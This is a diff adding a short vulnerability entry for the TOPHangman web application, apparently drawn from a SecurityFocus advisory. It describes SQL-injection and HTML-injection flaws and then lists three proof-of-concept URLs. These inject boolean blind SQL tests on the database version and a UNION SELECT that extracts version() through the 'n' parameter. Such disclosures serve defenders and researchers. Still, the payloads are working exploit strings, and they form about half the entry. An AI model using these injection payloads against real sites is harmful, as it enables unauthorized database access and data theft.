@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/43513/info
+
+TOPHangman is prone to an SQL-injection vulnerability and an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, or execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is viewed, and launch other attacks. 
+
+http://www.example.com/hangman/index.php?letters=A&n=1%20and%201=1+AND%20SUBSTRING(@@version,1,1)=5 TRUE
+http://www.example.com/hangman/index.php?letters=A&n=1%20and%201=1+AND%20SUBSTRING(@@version,1,1)=4 FALSE
+http://www.example.com/hangman/index.php?letters=A&n=1%20and%201=1+union+select+1,version()-- 
